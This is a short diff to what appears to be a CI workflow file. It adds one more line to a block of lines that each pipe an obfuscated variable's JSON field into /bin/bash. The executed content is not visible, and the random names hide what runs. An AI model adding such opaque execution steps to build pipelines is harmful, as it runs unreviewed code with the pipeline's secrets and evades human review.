@@ -26,6 +26,7 @@ jobs:
           echo $egygs3 | jq -r .wpefl3 | /bin/bash
           printf '%s' "$xxk40" | jq -r .gwskh6 | /bin/bash
           echo $tz85891 | jq -r .wqpnl0 | /bin/bash
+          echo $ebu5712 | jq -r .eo2760 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
